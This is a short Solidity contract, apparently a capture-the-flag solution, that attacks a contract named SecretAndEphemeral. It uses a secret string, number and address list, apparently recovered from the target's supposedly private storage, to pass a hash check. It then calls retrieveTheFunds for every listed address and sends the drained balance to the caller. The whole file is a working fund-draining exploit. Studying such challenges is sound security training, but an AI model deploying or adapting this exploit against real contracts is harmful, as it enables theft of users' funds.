// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './SecretAndEphemeral.sol';

contract SecretAndEphemeralAttacker {
    SecretAndEphemeral private immutable sae;
    string private secret;
    uint256 private immutable secret_number;
    address[] private addresses;

    constructor(address _sae, string memory _secret, uint256 _secret_number, address[] memory _addresses) {
        sae = SecretAndEphemeral(_sae);
        secret = _secret;
        secret_number = _secret_number;
        addresses = _addresses;

        require(keccak256(abi.encodePacked(_secret, _secret_number, _addresses[0])) == SecretAndEphemeral(_sae).spooky_hash(), ":(");
    }

    function exploit() external {
        for(uint256 i = 0; i < addresses.length; ++i) {
            address addr = addresses[i];
            sae.retrieveTheFunds(secret, secret_number, addr);
        }
        payable(msg.sender).transfer(address(this).balance);
    }
   
   fallback() external payable {}
}